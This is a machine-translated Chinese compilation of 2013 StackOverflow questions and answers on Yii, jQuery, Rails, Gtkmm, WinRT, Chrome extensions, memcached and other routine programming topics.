# StackOverflow 问答 15562000-15562999

# php - Yii 在示例 Web 应用程序中将用户存储在哪里

> ID：15562004
> 
> 赞同：0
> 
> 时间：2013-03-22T03:04:43.920
> 
> 标签：php, yii

在使用 yiic 创建的示例应用程序中，yii 有两个用户 demo/demo 和 admin/admin，yii 将用户信息存储在哪里？如果我想添加更多用户并且想将其添加到表 myUser 的数据库 myDB 中，该表包含两个字段，用户名和密码，该怎么办？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T03:45:20.633

用户信息在数组的 components/UserIdentity.pho 中定义。所以现在超级简单。但是如果你有一个用户表，你可以很容易地添加一个用户模型查找而不是检查用户数组。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T08:18:55.230

如果您想在您的应用中拥有更多用户，请尝试使用用户扩展来注册和管理用户帐户。请按照链接中的说明进行操作并享受。

> [http://www.yiiframework.com/extension/yii-user/](http://www.yiiframework.com/extension/yii-user/)

# html - 相对于其原始值减小 div 高度

> ID：15562007
> 
> 赞同：0
> 
> 时间：2013-03-22T03:05:09.713
> 
> 标签：html, css

如何降低 div 相对于本机呈现的高度的高度？

似乎是一个相当简单的问题，但将高度设置为百分比不是一个选项，也不是`margin: 0 -10px 0 0;`或`padding: 0 -10px 0 0;`（显然）div 中没有任何元素我可以减小它的大小，如果我应用边距它似乎可以工作，除了边界半径受到这个过程的伤害。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T04:20:58.100

使用jQuery：

```
$('div').animate({'height':'-=10px'}, 1000); 
```

“-=10px”会将当前高度降低 10px。

# jquery - Rails 3.2 中的 jQuery 不显示日期选择器

> ID：15562009
> 
> 赞同：0
> 
> 时间：2013-03-22T03:05:29.573
> 
> 标签：jquery, ruby-on-rails

我已经搜索过了，但我找不到任何适合我的情况。似乎 jQuery 在 Rails 中不能正常工作是一个很常见的问题，因为它被包含了两次。

就我而言，我不太确定发生了什么。我有一个包含在应用程序中的 script.js 文件，其中包含：

```
$(document).ready(function() {

    $("#to_date").datepicker();
    $("#from_date").datepicker();

}); 
```

datepicker() 不显示。

我有`jquery-rails`我的 Gemfile，它包含在 html 源代码中。

如果我将`script.js`文件更改为：

```
$(document).ready(function() {

    $("#to_date").hide();

}); 
```

它完美无缺！

所以问题不一定来自 jQuery 被包含两次，或者至少我是这么认为的。

我不想再花 3 个小时来解决它。扔掉你的任何想法，不管它看起来多么愚蠢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-22T04:51:33.953

在您的 Gemfile 中，添加

```
gem 'jquery-ui-rails' 
```

然后在你的`application.js`，添加

```
//= require jquery.ui.datepicker 
```

[在 github 上](https://github.com/joliss/jquery-ui-rails)查找有关 ui gem 的更多详细信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T05:38:54.117

请检查 jquery 文件的顺序，它以哪种模式加载。

`First of all jquery file has to be loaded then UI`，或剩余的文件。

# android - 用于 OCR 的 android phonegap 插件

> ID：15562017
> 
> 赞同：2
> 
> 时间：2013-03-22T03:06:16.057
> 
> 标签：android, cordova, plugins, ocr, local

我正在寻找一个 Android 版本的 PhoneGap OCR 插件。不幸的是，我不能将它用于 ocr-api-service，因为 OCR 库必须是本地的。然后我发现了这个[https://github.com/jcesarmobile/PhonegapOCRPlugin](https://github.com/jcesarmobile/PhonegapOCRPlugin)。不幸的是，它仅适用于 ios。所以我只是想知道是否存在这样的插件。谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-22T10:17:14.483

[Tesseract 支持 Android](https://stackoverflow.com/questions/7710123/how-can-i-use-tesseract-in-android)，因此您必须自己[创建一个 phonegap 插件](http://docs.phonegap.com/en/edge/guide_plugin-development_index.md.html#Plugin%20Development%20Guide)来包装 ocr 功能。

# css - 使用 CSS3 缓和数十个 div 的最有效方法

> ID：15562021
> 
> 赞同：2
> 
> 时间：2013-03-22T03:06:50.267
> 
> 标签：css, benchmarking, css-transitions, easing

我每秒添加十个 div，每个都有一个图像，我希望它们从左侧滑入。这对于 javascript 来说是太密集的工作，对于关键帧来说也太多了。

那么什么是最有效的（CPU/内存方面，也考虑到移动设备）这样做的方式是什么？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T04:01:48.873

您可以使用 JS 使用 setInterval 向它们添加一个类，然后对该类使用 CSS 转换吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T19:05:21.553

使用[jQuery Transit 之](http://ricostacruz.com/jquery.transit/)类的框架可以轻松完成此任务。这个框架的伟大之处在于它在移动设备上运行良好（在合理范围内），并尽可能使用浏览器的硬件加速功能。

## [JS 小提琴示例](http://jsfiddle.net/nYJNz/)

**Javascript：**

```
$(document).ready(function () {

    showDiv($('div:first'), 90);

    function showDiv(div, pixels) {
        div.transition({
            opacity: 1,
            left: pixels + '%'
        }, 1000, 'out', function () {
            //call back
            showDiv(div.next("div"), pixels - 10);
        });
    }
}); 
```

无论如何，这不是一个完美的例子，但它应该引导你朝着正确的方向前进。

那些生活在边缘的人的[疯狂模式。](http://jsfiddle.net/nYJNz/1/)

# javascript - 使用 jquery 删除动态生成的 div

> ID：15562023
> 
> 赞同：2
> 
> 时间：2013-03-22T03:07:00.123
> 
> 标签：javascript, jquery

当使用 jQuery 选中/取消选中相应的复选框时，我想添加/删除一个新的 div。这是我的尝试：

```
<script type="text/javascript">
    $(function() {
        $("#form1 :checkbox#checkbox1").click(function() {
            var d = document.createElement('div');
            if ($(this).is(":checked")) {
                $(d).addClass("newdiv")
                    .html("This is a new div")
                    .appendTo($("#mydiv"))
                    .hide()
                    .fadeIn(1000);
                }
            else {
                //$(".newdiv").fadeOut(1000);
                $(d).fadeOut(1000);
            }
        });
    });
</script> 
```

fadeIn 过程顺利出来。但是，当我尝试使用相同的方法淡出 $(d) 时，它不起作用：新生成的 div 仍保留在页面上。我做了一些研究并得到了解决，`$(".newdiv").fadeOut(1000);`（在上面的代码中注释），但我认为这对我来说不是最好的解决方案。而且我真的很想知道为什么我的第一次尝试没有奏效。有什么建议么？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T03:25:14.767

您可以进行一些更改
1\. 不需要选择器`#form1 :checkbox#checkbox1`，因为您有复选框的 id，您可以只使用`#checkbox1`
2\. 使用 jQuery 而不是使用 createElement 创建 div `$('<div/>')`
3\. 淡出 div 后，您需要将其删除来自dom

```
$(function() {
    $("#checkbox1").click(function() {
        if ($(this).is(":checked")) {
            $('<div/>').addClass("newdiv")
            .html("This is a new div")
            .appendTo($("#mydiv"))
            .hide()
            .fadeIn(1000);
        }
        else {
            $('#mydiv .newdiv').fadeOut(function(){
                $(this).remove()
            })
        }
    });
}); 
```

演示：[小提琴](http://jsfiddle.net/arunpjohny/dSBVT/)

另一种解决方案是有一个`div`将显示和隐藏的静态

```
$(function() {
    var div = $('<div/>').addClass("newdiv")
            .html("This is a new div")
            .appendTo($("#mydiv"))
            .hide();
    $("#checkbox1").click(function() {
        if ($(this).is(":checked")) {
            div.fadeIn(1000);
        } else {
            div.fadeOut(1000)
        }
    });
}); 
```

演示：[小提琴](http://jsfiddle.net/arunpjohny/dSBVT/2/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T03:34:00.183

## [***jsFiddle 演示***](http://jsfiddle.net/E7Ny6/3/)

每次单击处理程序运行时，您都会创建一个`d`带有新元素的新变量。相反，在单击处理程序之前执行此操作，因此每个实例都将引用相同的元素。我在下面包含了其他可选的改进。

事件更[`change`](http://api.jquery.com/change)适合复选框。另外，请注意我将您的选择器设置为 just `#checkbox1`，因为它已经明确且非常具体。

为了获得更好的视觉效果，不要添加元素，隐藏它，然后淡入。在大多数浏览器中，元素会在它出现之前闪烁。相反，使用一个类来隐藏它 css: `.hidden {display: none;}`。您还可以使用[`fadeToggle`](http://api.jquery.com/fadeToggle)来切换可见性，而不是执行 if/else。[`clearQueue`](http://api.jquery.com/clearQueue)在过渡期间删除多次单击的额外事件，并使过渡看起来更平滑。

最后，使用 jQuery 创建元素：

```
$(function () {
    var $d = $('<div>', {
        "class": "hidden",
        text: "This is a new div"
    }).appendTo("#mydiv");

    $("#checkbox1").change(function () {
        $d.clearQueue()
          .stop()
          .fadeToggle(1000);
    });
}); 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-03-22T03:16:57.447

你最好制作一个 jQuery 对象。

```
<script type="text/javascript">
    $(function() {
        $("#checkbox1").click(function() {
            var d = $('<div class="newdiv"></div>');
            if ($(this).is(":checked")) {
                d.html("This is a new div")
                .appendTo($("#mydiv"))
                .hide()
                .fadeIn(1000);
                }
            else {
                d.fadeOut(1000);
            }
        });
    });
</script> 
```

# google-chrome - Chrome扩展通过后台页面下载多个文件

> ID：15562024
> 
> 赞同：4
> 
> 时间：2013-03-22T03:07:09.533
> 
> 标签：google-chrome, google-chrome-extension

我的 chrome 扩展弹出窗口在会话期间间歇性地接收来自用户的输入，弹出窗口将用户数据发送到后台页面并存储在那里（继续附加），当用户关闭特定网页时，后台数据作为文本文件转储到本地机器中。

当用户在同一会话中打开同一网页时，无法下载存储在后台的新用户数据，因为在后台，chrome 阻止了下载“此站点正在尝试下载多个文件，您要允许吗”。这种情况是bcoz，第二次下载尝试后台页面保持不刷新，相当于下载了多次。

如何强制下载文件？有没有办法多次提及从后台页面下载的豁免或

每次后台下载后有什么方法可以刷新后台html页面。

谢谢 ！

# algorithm - 复杂性等级 P 的性质

> ID：15562025
> 
> 赞同：2
> 
> 时间：2013-03-22T03:07:13.857
> 
> 标签：algorithm, class, complexity-theory

我正在阅读《算法导论》第三版这本书。定理 34.2 有一个证明（第 1059 页）：

> **因为多项式时间算法决定的语言类别是多项式时间算法接受的语言类别的子集，所以**我们只需证明如果 L 被多项式时间算法接受，它是由多项式时间决定的算法。令 L 为某个多项式时间算法 A 所**接受**的语言……（证明被省略）……因此 A 是**决定**L的多项式时间算法。

我认为这意味着如果有两个集合A和B，并且A是B的子集，并且元素x∈A，这证明x∈B。

此外，我理解“由多项式时间算法决定的语言类别是多项式时间算法接受的语言类别的子集”。所以这个证明让我感到困惑......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T06:16:46.260

> 在计算复杂性理论中，P，也称为 PTIME 或 DTIME(n^O(1))，是最基本的复杂性类别之一。它包含所有可以通过确定性图灵机使用多项式计算时间或多项式时间来解决的决策问题。

来源：[维基百科：P（复杂性）](http://en.wikipedia.org/wiki/P_%28complexity%29)

# jquery - 带有 div 的 jQuery 树结构

> ID：15562026
> 
> 赞同：1
> 
> 时间：2013-03-22T03:07:14.107
> 
> 标签：jquery

我想创建一个与此示例完全相同的树结构，但使用 div（不使用表格）：

[https://github.com/wesnolte/jOrgChart](https://github.com/wesnolte/jOrgChart)

我想这样做的原因是我想在缩放不同元素之间的垂直距离方面有更大的灵活性，所以我想避免使用行结构。

有没有人有一个很好的例子来说明如何做到这一点？

# wpf - Visual Studio 2010 Professional 问题创建新的 wpf 项目

> ID：15562027
> 
> 赞同：0
> 
> 时间：2013-03-22T03:07:14.330
> 
> 标签：wpf, visual-studio-2010

我在 VS 2010 Professional 中创建新的 WPF 项目时遇到问题。

这是我得到的错误：

![在此处输入图像描述](../Images/d75792ca080ba7634836f599435416b2.png)

![在此处输入图像描述](../Images/26aafb4eb3564fcd422365bc5a914194.png)

有人可以帮我吗？非常感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T16:08:00.847

也许您不会被迫重新安装 Visual Studio。

首先在具有管理员权限的命令行中尝试`devenv /installvstemplates`。这应该会恢复您的模板。

# c++ - 跟踪/断点陷阱（核心转储） Gtkmm

> ID：15562030
> 
> 赞同：0
> 
> 时间：2013-03-22T03:07:43.140
> 
> 标签：c++, gtkmm, coredump

**这是家庭作业**

嘿，我使用 Gtkmm 进行分配，我一直都做得很好，但是我在用来填充 TreeView 的函数中遇到了一个奇怪的问题，你得到了错误

（出：21185）：GLib-ERROR **：/build/buildd/glib2.0-2.32.3/./glib/gmem.c:408：溢出分配 3908326912*4 字节跟踪/断点陷阱（核心转储）

然而，奇怪的是我将这个函数用于 3 个单独的 TreeViews，而且它只是在我最近写的我写的我得到这个错误

我已将问题隔离到线路上

```
*m_refTreeModel = Gtk::ListStore::create((*m_columns)); 
```

关于如何发生这种情况的任何想法？我的程序相当大，因此很难上传与此相关的所有源代码。但是，这是该行所在的功能

控制器.cpp

```
#include "Controller.h"
#include "ModelColumns.h"
#include <iostream>

Controller::Controller()
{
    mainMenue = (MainMenueView*) new MainMenueView(this);
    studentMenue = (StudentMenueView*) new StudentMenueView(this);
    degreeMenue = (DegreeMenueView*) new DegreeMenueView(this);
    underGradView = (UnderGradView*) new UnderGradView(this);
    workExpView = (WorkExpView*) new WorkExpView(this);
    relatedCourseView = (RelatedCourseView*) new RelatedCourseView(this);
    tAExpView = (TAExpView*) new TAExpView(this);
    referencesView = (ReferencesView*) new ReferencesView(this);
    gradView = (GradView*) new GradView(this);
    adminMenueView = (AdminMenueView*) new AdminMenueView(this);
    viewPendingAppsMenue = (ViewPendingAppsMenue*) new ViewPendingAppsMenue(this);
    pendingAppsView = (PendingAppsView*) new PendingAppsView(this);
    assignMenueView = (AssignMenueView*) new AssignMenueView(this);
    assignSuccessView = (AssignSuccessView*) new AssignSuccessView(this);
    editLoginView = (EditLoginView*) new EditLoginView(this);
    editAppView = (EditAppView*) new EditAppView(this);

    //Setting up the window
    set_title("");
    set_border_width(10);
    set_default_size(700,400);

    //setting up the notebook
    gui.set_border_width(10);
    gui.set_show_tabs(false);
    add(gui);

    gui.append_page((*mainMenue));
    gui.append_page((*studentMenue));
    gui.append_page((*degreeMenue));
    gui.append_page((*underGradView));
    gui.append_page((*workExpView));
    gui.append_page((*relatedCourseView));
    gui.append_page((*tAExpView));
    gui.append_page((*referencesView));
    gui.append_page((*gradView));
    gui.append_page((*adminMenueView));
    gui.append_page((*viewPendingAppsMenue));
    gui.append_page((*pendingAppsView));
    gui.append_page((*assignMenueView));
    gui.append_page((*assignSuccessView));
    gui.append_page((*editLoginView));  
    gui.append_page((*editAppView));
    show_all_children();

}

Controller::~Controller()
{
delete mainMenue;
delete studentMenue;
delete degreeMenue;
delete underGradView;
delete workExpView;
delete relatedCourseView;
delete tAExpView;
delete referencesView;
delete gradView;
delete adminMenueView;
delete viewPendingAppsMenue;
delete pendingAppsView;
delete assignMenueView;
delete assignSuccessView;
}

void Controller::fillTreeModel(const Glib::ustring &page, const Glib::ustring &type, const Glib::ustring type1)
{
ModelColumns *m_columns;
Gtk::TreeView *m_TreeView;
Glib::RefPtr<Gtk::ListStore> *m_refTreeModel;
std::string temp;
int tempNum;

if (page == "Pending")
{
    m_columns = &(pendingAppsView -> m_columns);
    m_TreeView = &(pendingAppsView -> m_TreeView);
    m_refTreeModel = &(pendingAppsView -> m_refTreeModel);
}
else if (page == "Assign")
{
    m_columns = &(assignSuccessView -> m_columns);
    m_TreeView = &(assignSuccessView -> m_TreeView);
    m_refTreeModel = &(assignSuccessView -> m_refTreeModel);
}
else if (page == "Edit")
{
    m_columns = &(editAppView -> m_columns);
    m_TreeView = &(editAppView -> m_TreeView);
    m_refTreeModel = &(editAppView -> m_refTreeModel);
}

if (type1 == "Pending")
{
    temp = "Pending";
}
if (type1 == "Student")
{
    tempNum = stuNumHold;
}
else
{
    temp = "";
}

//setting up the next page's treeView
if (type == "View All")
{
    model.pendingApps.fillGrads(temp);
    model.pendingApps.fillUnderGrads(temp);
}
else if (type == "Student")
{
    model.pendingApps.fillGrads(tempNum);
    model.pendingApps.fillUnderGrads(tempNum);
//std::cout << "here4" << std::endl;
}
else
{
    std::string tbCourse = Glib::locale_from_utf8(type);
    model.pendingApps.fillGrads(&tbCourse, temp);
    model.pendingApps.fillUnderGrads(&tbCourse, temp);
}

     //std::cout << model.pendingApps.underGrads[0].getStuNum() << "***" << std::endl;

*m_refTreeModel = Gtk::ListStore::create((*m_columns));

    //std::cout << model.pendingApps.underGrads[0].getStuNum() << "***" << std::endl;

(*m_TreeView).set_model((*m_refTreeModel));
Gtk::TreeModel::Row row;

   //std::cout << model.pendingApps.underGrads[0].getStuNum() << "***" << std::endl;

while (model.pendingApps.grads.front() != NULL || model.pendingApps.underGrads.front() != NULL)
{
//std::cout << "here" << std::endl;
    Grad *tempGrad = model.pendingApps.grads.front();
    UnderGrad *tempUnderGrad = model.pendingApps.underGrads.front();

    std::string temp1, temp2;
    if (model.pendingApps.grads.front() != NULL)
    {
        temp1 = (*tempGrad).getCourse();
    }
    if (model.pendingApps.underGrads.front() != NULL)
    {
        temp2 = (*tempUnderGrad).getCourse();
    }

    if (model.pendingApps.underGrads.front() != NULL && type == "View All" && (tempGrad == NULL || strcmp(temp1.c_str(), temp2.c_str()) > 0))
    {
        row = *((*m_refTreeModel) -> append());
        row [m_columns -> m_col_appNum] = (*tempUnderGrad).getAppNum();
        row [m_columns -> m_col_degree] = "Undergraduate";
        row [m_columns -> m_col_course] = (*tempUnderGrad).getCourse(); 
        row [m_columns -> m_col_first] = (*tempUnderGrad).getFName(); 
        row [m_columns -> m_col_last] = (*tempUnderGrad).getLName(); 
        row [m_columns -> m_col_email] = (*tempUnderGrad).getEmail(); 
        row [m_columns -> m_col_major] = (*tempUnderGrad).getMajor(); 
        row [m_columns -> m_col_field] = ""; 
        row [m_columns -> m_col_sup] = ""; 
        row [m_columns -> m_col_stuNum] = (*tempUnderGrad).getStuNum(); 
        row [m_columns -> m_col_year] = (*tempUnderGrad).getYear(); 
        row [m_columns -> m_col_gpa] = (*tempUnderGrad).getGPA(); 
        row [m_columns -> m_col_cGPA] = (*tempUnderGrad).getCGPA();
        row [m_columns -> m_col_app_status] = (*tempUnderGrad).getAppStatus();
        model.pendingApps.underGrads.popFront();

    }
    else if (model.pendingApps.grads.front() != NULL && type == "View All" && (tempUnderGrad == NULL || strcmp(temp1.c_str(), temp2.c_str()) <= 0))
    {
        row = *((*m_refTreeModel) -> append());
        row [m_columns -> m_col_appNum] = (*tempGrad).getAppNum();
        row [m_columns -> m_col_degree] = "Graduate";
        row [m_columns -> m_col_course] = (*tempGrad).getCourse(); 
        row [m_columns -> m_col_first] = (*tempGrad).getFName(); 
        row [m_columns -> m_col_last] = (*tempGrad).getLName(); 
        row [m_columns -> m_col_email] = (*tempGrad).getEmail(); 
        row [m_columns -> m_col_field] = (*tempGrad).getResearch(); 
        row [m_columns -> m_col_sup] = (*tempGrad).getSupervisor();
        row [m_columns -> m_col_stuNum] = (*tempGrad).getStuNum(); 
        row [m_columns -> m_col_app_status] = (*tempGrad).getAppStatus();

        model.pendingApps.grads.popFront();
    }
    else if (model.pendingApps.underGrads.front() != NULL && model.pendingApps.grads.front() != NULL && type != "View All")
    {
        row = *((*m_refTreeModel) -> append());
        row [m_columns -> m_col_appNum] = (*tempGrad).getAppNum();
        row [m_columns -> m_col_degree] = "Graduate";
        row [m_columns -> m_col_course] = (*tempGrad).getCourse(); 
        row [m_columns -> m_col_first] = (*tempGrad).getFName(); 
        row [m_columns -> m_col_last] = (*tempGrad).getLName(); 
        row [m_columns -> m_col_email] = (*tempGrad).getEmail(); 
        row [m_columns -> m_col_field] = (*tempGrad).getResearch(); 
        row [m_columns -> m_col_sup] = (*tempGrad).getSupervisor();
        row [m_columns -> m_col_stuNum] = (*tempGrad).getStuNum(); 
        row [m_columns -> m_col_app_status] = (*tempGrad).getAppStatus();

        model.pendingApps.grads.popFront();
    }
    else
    {

        row = *((*m_refTreeModel) -> append());
        row [m_columns -> m_col_appNum] = (*tempUnderGrad).getAppNum();
        row [m_columns -> m_col_degree] = "Undergraduate";
        row [m_columns -> m_col_course] = (*tempUnderGrad).getCourse(); 
        row [m_columns -> m_col_first] = (*tempUnderGrad).getFName(); 
        row [m_columns -> m_col_last] = (*tempUnderGrad).getLName(); 
        row [m_columns -> m_col_email] = (*tempUnderGrad).getEmail(); 
        row [m_columns -> m_col_major] = (*tempUnderGrad).getMajor(); 
        row [m_columns -> m_col_field] = ""; 
        row [m_columns -> m_col_sup] = ""; 
        row [m_columns -> m_col_stuNum] = (*tempUnderGrad).getStuNum(); 
        row [m_columns -> m_col_year] = (*tempUnderGrad).getYear(); 
        row [m_columns -> m_col_gpa] = (*tempUnderGrad).getGPA(); 
        row [m_columns -> m_col_cGPA] = (*tempUnderGrad).getCGPA();
        row [m_columns -> m_col_app_status] = (*tempUnderGrad).getAppStatus();
        model.pendingApps.underGrads.popFront();
    }
}

} 
```

控制器.h

```
#ifndef CONTROLLER_H
#define CONTROLLER_H

#include <gtkmm.h>

#include "MainMenueView.h"
#include "StudentMenueView.h"
#include "DegreeMenueView.h"
#include "UnderGradView.h"
#include "WorkExpView.h"
#include "RelatedCourseView.h"
#include "TAExpView.h"
#include "ReferencesView.h"
#include "GradView.h"
#include "AdminMenueView.h"
#include "ViewPendingAppsMenue.h"
#include "PendingAppsView.h"
#include "Model.h"
#include "AssignMenueView.h"
#include "AssignSuccessView.h"
#include "EditAppView.h"
#include "EditLoginView.h"

class MainMenueView;
class StudentMenueView;
class DegreeMenueView;
class UnderGradView;
class WorkExpView;
class RelatedCourseView;
class TAExpView;
class ReferencesView;
class GradView;
class AdminMenueView;
class ViewPendingAppsMenue;
class PendingAppsView;
class AssignMenueView;
class AssignSuccessView;
class EditAppView;
class EditLoginView;

 class Controller : public Gtk::Window
{
public:
    Controller();
    virtual ~Controller();
    Gtk::Notebook gui;
    int appNumber, stuNumHold;
    Glib::ustring degreeLevel, courseApplied, searchType;
    Glib::ustring studentMode;

    void fillTreeModel(const Glib::ustring&, const Glib::ustring&, const Glib::ustring);

    Model model;
private:
    MainMenueView *mainMenue; //0
    StudentMenueView *studentMenue; //1
    DegreeMenueView *degreeMenue; //2
    UnderGradView *underGradView; //3
    WorkExpView *workExpView; //4
    RelatedCourseView *relatedCourseView; //5
    TAExpView *tAExpView; //6
    ReferencesView *referencesView;  //7
    GradView *gradView; //8
    AdminMenueView *adminMenueView; //9
    ViewPendingAppsMenue *viewPendingAppsMenue; //10
    PendingAppsView *pendingAppsView; //11
    AssignMenueView *assignMenueView; //12
    AssignSuccessView *assignSuccessView; //13
    EditLoginView *editLoginView; //14
    EditAppView *editAppView; //15
};

#endif 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T03:15:44.400

在`Controller::fillTreeModel(const Glib::ustring &, const Glib::ustring &, const Glib::ustring)`中，如果`page`不是“Pending”、“Assign”或“Edit”之一，`m_Columns`则永远不会被初始化。我没有查看所有代码，因为它相当长，但如果`3908326912`不是故意的，这很可能是问题（虽然我不确定 a`ModelColumns`是什么）。

我建议你有一个默认情况，它要么分配一个默认的回退值，要么抛出一个异常。

# unity3d - 游戏对象中的相对 UILabel

> ID：15562031
> 
> 赞同：0
> 
> 时间：2013-03-22T03:07:46.250
> 
> 标签：unity3d, ngui

我创建了一个游戏对象，它充当我动态填充的 UIGrid 的重复项。游戏对象（RowItem）有几个 UILabel，其文本可以根据内容在运行时更改。当文本变大时，这些 UILabel 的内容会重叠。当文本更多/更少时，任何人都可以帮助我如何使 UILabel 相对于相邻的 UILabel 扩展？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-25T06:50:37.250

您可以通过以下方式获取以像素为单位的文本长度：

```
UILabel label;
float width = label.relativeSize.x * label.transform.localScale.x;
float height = label.relativeSize.y * label.transform.localScale.y; 
```

假设您要将最大长度设置为 100，您可以这样做：

```
if (width > 100)
{
    label.localScale = new Vector3(100 / label.relativeSize.x, 100/ label.relativeSize.x, 1);
} 
```

Vector3 的第二个参数也基于 relativeSize.x 不是错字，这确保您的文本不会变薄。

希望这有效。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T08:35:29.343

您可以使用's 属性`transform.localScale`的`UILabel`属性对其进行缩放。当文本大于20个字符时，只需将它们放大即可。尝试使用任意值。
此外，当您更改比例时，请运行重新对​​齐方法，该方法对齐其他标签，使它们不重叠。

# javascript - 尝试触发 Javascript onBlur 事件以进行表单验证得到空错误

> ID：15562032
> 
> 赞同：0
> 
> 时间：2013-03-22T03:07:46.393
> 
> 标签：javascript

我正在尝试编写表单验证，以提醒用户如果他们在没有输入任何值的情况下移动到输入文本字段，每次我测试它时都会收到错误消息：

> 类型错误：名字为空
> 
> firstName.onblur = ValidateForm;

```
<script type="text/javascript">
    document.getElementById("firstname").onblur = ValidateForm; 

    function ValidateForm() {
        var firstName = document.getElementById("firstname");
        if(firstName.value == 0) {
                alert("You need to enter a value into the first name field bro");
                firstName.focus();
        }
    }
</script> 
```

它在我使用时有效，`window.onload = ValidateForm;`但我想使用此事件处理程序尝试它

如何解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T03:24:23.963

javascript代码看起来不错。确保您在...之后拥有 javascript。如果您在相关 HTML 片段之前声明您的事件处理程序，它可能在 firefox 中有效，但在 chrome 中无效。它还解释了为什么 window.load 在这种情况下有效。

# c++ - 如何为原生代码库 (C/C++) 编写我自己的 Javascript API（客户端）

> ID：15562034
> 
> 赞同：0
> 
> 时间：2013-03-22T03:07:48.630
> 
> 标签：c++, c, node.js, client-side

我必须为客户端开发一个带有 HTML 5 和 Javascript 的 Web 应用程序。但是我需要使用提供客户端本机库（.dll/.so）的功能来使用 C/C++ 在它的机器上处理一些数据。

我喜欢用 Javascript 编写自己的 API 来访问本机库，例如[NodeJS 的插件](http://nodejs.org/api/addons.html)定义，但这些插件只能从 NodeJS（服务器端）访问。还有一个完善的 NPAPI，但似乎 Google 的 PPAPI 想要替换它：我无法决定其中任何一个。

有没有类似于 NodeJS 的客户端插件，让我只关注 C++、Javascript 和 HTML 5？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T04:05:01.693

不是一般意义上的。允许使用 node.js 的插件，因为代码的作者和运行它的人之间存在隐含的信任关系。（事实上​​，他们通常是同一个人。）在网络浏览器中，不存在这样的信任——通过浏览一个网站，你让编写该网站的人在你的系统上运行一些代码。由于您（可能）不完全信任它们，因此它们在 Javascript 中可以执行的操作仅限于一组已知的安全操作。加载 DLL*并不*在该集合中。

正如 generalhenry 在评论中指出的那样，有一些项目，如[emscripten](https://github.com/kripken/emscripten)将本机代码编译为 Javascript，或[Google Native Client](https://code.google.com/p/nativeclient/)以在浏览器中运行沙盒本机代码，但这些技术仍然受到功能限制，而且还很不成熟。最终，您将需要接受在浏览器中运行的代码将受到限制的事实。

# c# - 在 WinRT 中处理控件上的水平滑动

> ID：15562037
> 
> 赞同：1
> 
> 时间：2013-03-22T03:07:56.757
> 
> 标签：c#, .net, windows-runtime, windows-store-apps, winrt-xaml

因此，假设我在左边缘有宽度为 200 像素的堆栈面板。现在我想在这个面板上处理从左到右的水平滑动并显示附加面板。然后处理从右向左滑动以隐藏它。

我尝试处理页面`ManipulationStarted`和`ManipulationDelta`事件，但它似乎至少对鼠标没有任何影响。任何想法，有什么简单的方法可以实现？

我试过的：处理页面的滑动事件和滑动检查的开始，如果它是在堆栈面板的范围内开始的，否则我忽略它。

如果滑动的增量大于正 40，看起来滑动是从左到右的。

我的 XAML 文件：

```
// standard stuff of page
<Grid Background="{StaticResource ApplicationPageBackgroundThemeBrush}">
    <StackPanel Orientation="Vertical" Width="200" HorizontalAlignment="Left" Background="White" x:Name="Panel"/>
</Grid> 
```

// 继续标准的东西

C# 文件：

```
 public MainPage()
    {
        this.InitializeComponent();
        this.ManipulationDelta += MainPage_ManipulationDelta;
        this.ManipulationStarted += MainPage_ManipulationStarted;
    }

    private void MainPage_ManipulationStarted(object sender, ManipulationStartedRoutedEventArgs e)
    {
        System.Diagnostics.Debug.WriteLine("heh");
        if (e.Position.X < 200)
        {
            initialPoint = e.Position;
            isSwiping = true;
        }
    }

    private void MainPage_ManipulationDelta(object sender, ManipulationDeltaRoutedEventArgs e)
    {
       if (e.IsInertial && isSwiping)
        {
            Point currentPoint = e.Position;
            if (currentPoint.X - initialPoint.X >= 40)
            {
                isSwiping = false;
                e.Complete();

                System.Diagnostics.Debug.WriteLine("finished swipe :)");
            }
        }
    }

    private Point initialPoint;
    private Boolean isSwiping; 
```

（再次省略默认空页）

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-22T17:54:31.140

您需要在控件上设置 ManipulationMode，例如 ManipulationMode="TranslateX" 并让控件响应命中测试（即，如果它没有背景 - 将背景设置为透明）以接收操作事件。

再说一遍 - 为什么不直接使用内置支持滑动的 ListView 呢？

# ios - 当我想在我的 iPhone 应用、sqlite 或 JSON 文件中缓存一些数据时？

> ID：15562043
> 
> 赞同：0
> 
> 时间：2013-03-22T03:08:47.993
> 
> 标签：ios, sqlite, caching

我有一些数据想要缓存在我的 iPhone 应用程序中，日期更改不那么频繁。

我想用 SQLite 来存储它们，但是 SQLite 会在应用程序中启动，消耗一些内存，如果没有必要呢？

我可以使用简单的 txt 文件来存储 JSON 格式的数据吗？我仍然担心我将管理文件的打开、写入、读取成本等。

# mysql - MySQL 服务器上的 Memcached？

> ID：15562044
> 
> 赞同：1
> 
> 时间：2013-03-22T03:08:56.040
> 
> 标签：mysql, drupal, memcached

我刚刚安装`yum install memcached`在 MySQL 服务器上。但是，照原样`service memcached status`做`Running..`更多的事情，因为我认为性能方面没有发生任何事情。我想我仍然需要配置 MySQL 以使用 Memcached。

*   MySQL 端需要什么配置才能与 Memcached 对话？（怎么做？）
*   甚至还需要从 Web Server 端进行配置？

请帮助我卡住了。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-22T03:49:10.350

